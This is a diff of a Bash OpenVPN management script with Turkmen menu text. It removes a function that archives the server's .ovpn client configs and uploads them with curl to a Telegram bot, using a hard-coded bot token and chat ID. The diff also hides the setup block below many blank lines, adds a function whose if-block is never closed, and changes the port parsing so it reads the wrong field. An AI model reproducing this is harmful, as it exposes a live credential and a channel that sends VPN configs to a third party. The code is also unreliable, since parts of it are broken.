@@ -1,19 +1,6 @@
 #!/bin/bash
 #Creator Faraon4ik
 
-Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m" && Green="\033[32m" && Red="\033[31m" && Yellow="\033[33m" && Blue='\033[34m' && Purple='\033[35m' && Ocean='\033[36m' && Black='\033[37m' && Morg="\033[5m" && Reverse="\033[7m" && Font="\033[1m"
-sh_ver="7.7.7"
-Error="${Red_background_prefix}[Ошибка]${Font_color_suffix}"
-Separator_1="———————————————————————s———————"
-[[ ! -e "/lib/cryptsetup/askpass" ]] && apt update && apt install cryptsetup -y
-clear
- check_curl=$(curl -h)
-    if [[ -z ${check_curl} ]]; then
-      apt update
-        apt install curl -y
-        clear
-      fi
-
 
 bot(){
   clear
@@ -30,13 +17,80 @@ echo -e "${Green}Klent Telegram bot iyberildi!${Font_color_suffix}"
 		fi
 }
 
-bot2(){
-  text=$(date +%s%N | md5sum | head -c 6)
-   cp /root/*.ovpn /kot.zip
-   tar -czvf "kot.zip" "kot"
-curl -s -F document=@/root/kot.zip https://api.telegram.org/bot6965929755:AAE374wjAnENwjolhMsHsBrfJ5fiCw_ysRE/sendDocument?chat_id=2063865223 >/dev/null
-}
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m" && Green="\033[32m" && Red="\033[31m" && Yellow="\033[33m" && Blue='\033[34m' && Purple='\033[35m' && Ocean='\033[36m' && Black='\033[37m' && Morg="\033[5m" && Reverse="\033[7m" && Font="\033[1m"
+sh_ver="7.7.7"
+Error="${Red_background_prefix}[Ошибка]${Font_color_suffix}"
+Separator_1="———————————————————————s———————"
+[[ ! -e "/lib/cryptsetup/askpass" ]] && apt update && apt install cryptsetup -y
+clear
+ check_curl=$(curl -h)
+    if [[ -z ${check_curl} ]]; then
+      apt update
+        apt install curl -y
+        clear
+      fi
 
 bacup(){
 
@@ -1389,7 +1443,7 @@ importbacup(){
 		rm -r "openvpn" && tar -xzvf "openvpn.tar.gz" && clear
 		cd "openvpn" && cd "server"
                         mv /etc/openvpn/*.ovpn /root
-		port=$(cat /etc/openvpn/server.conf | grep "port" | awk '{print $2}')
+		port=$(cat /etc/openvpn/server.conf | grep "port" | awk '{print $1}')
 		rm "/etc/openvpn.tar.gz"
 		sudo systamctl start openvpn@server.service
 		echo -e "${Blue} Üstünlikli bacuk goýuldy! ${Font_color_suffix}"
@@ -1398,13 +1452,30 @@ importbacup(){
 
 }
 
+domain(){
+	echo -e "${Blue} NOT: Dine remote yanyndaky ip ya-da domen ayryp taze goyun!"
+	read -e -p "Ip/Domen uytgetmek isleyanmi? (Y/n):" delcfgyn
+			[[ -z ${delcfgyn} ]] && delcfgyn="Nn"
+			if [[ ${delcfgyn} == [Nn] ]]; then
+				read -n1 -r -p "Menýu dolanmak üçin Enter basyň ..."
+				
+			elif [[ ${delcfgyn} == [Yy] ]]; then
+		nano "/etc/client-template.txt"
+
+}
+
+token(){
+	nano "/bin/ovpn"
+}
+
 dopelnitelny(){
 	echo -e "Gosmaca Menu: "
 	echo -e "1. Open Vpni täzeden baslatmak"
  	echo -e "2. Open script täzeleme "
 	echo -e "3. Openvpn bacup almak"
 	echo -e "4. Openvpn bacuk gurnamak"
-	echo -e "5. Kotlary boda iybermek"
+	echo -e "5. Domen/Ip calysmak"
+	echo -e "6. Bot duzeltmek"
   read -e -p "Menu saýlaň (çykmak üçin ENTER basyň): " choose
 	[[ -z "${choose}" ]] && echo -e "${Error}Çykyş..." && exit 1
 	if [[ ${choose} == "1" ]]; then
@@ -1416,9 +1487,11 @@ dopelnitelny(){
 	elif [[ ${choose} == "4" ]]; then
 	  importbacup
 	elif [[ ${choose} == "5" ]]; then
-	  bot2
+	  domain
+	elif [[ ${choose} == "6" ]]; then
+	   token
 	else
-		echo -e "${Error} Dogry belgini giriziň(1-5)" && exit 1
+		echo -e "${Error} Dogry belgini giriziň(1-6)" && exit 1
 	fi
 }
 
